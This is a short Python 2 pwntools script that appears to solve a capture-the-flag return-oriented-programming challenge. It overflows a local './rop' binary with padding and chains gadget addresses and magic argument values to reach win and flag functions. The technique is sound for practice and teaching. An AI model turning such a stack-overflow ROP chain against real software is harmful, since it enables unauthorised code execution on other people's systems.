#import from py
import re

#outside imports
from pwn import *

#used for pulling the flag from output
flag_regex = r"flag\{[^}]+\}"
global_timeout = 5 #seconds

do_remote = False
binary_name = './rop'

#for doing local debugging
is_local_dbg = True
gdb_script = '''
set pagination off
set disassembly-flavor intel
i proc mappings
b *0x080485cb
b *0x08048714
b *0x804878d
'''



DATA = ''
# DATA += 'A' * 2048
# DATA += p64(0x00400621)
# DATA += p64(0x00400621)
# DATA += p64(0x00400621)

#uncomment these
DATA += ('AAAAAAAA')
DATA += ('AAAAAAAA')
DATA += ('AAAAAAAA')

DATA += ('BBBB')

DATA += p64(0x080485d6)
DATA += p64(0x080485d6)
DATA += p64(0x080485cb)
DATA += ('AAAAAAAA')
DATA += ('AAAAAAAA')
DATA += ('AAAAAAAA')
DATA += ('AAAAAAAA')

# DATA += ('0000003b')

# DATA += p64(0x00)
# DATA += p64(0x0040062e)

padding = 'A' * 28

win1_addr = p32(0x80485cb)
win2_addr = p32(0x80485d8)
flag_addr = p32(0x804862b)

pop_ret_gadget = p32(0x08048806)

arg_check1 = p32(0xBAAAAAAD)
arg_check2 = p32(0xDEADBAAD)

exploit = padding + win1_addr + win2_addr + pop_ret_gadget + arg_check1 + flag_addr + pop_ret_gadget + arg_check2

if is_local_dbg:
    target = gdb.debug(binary_name, gdb_script)
else:
    target = process(binary_name)
print target.read()
target.sendline(exploit)
target.interactive()

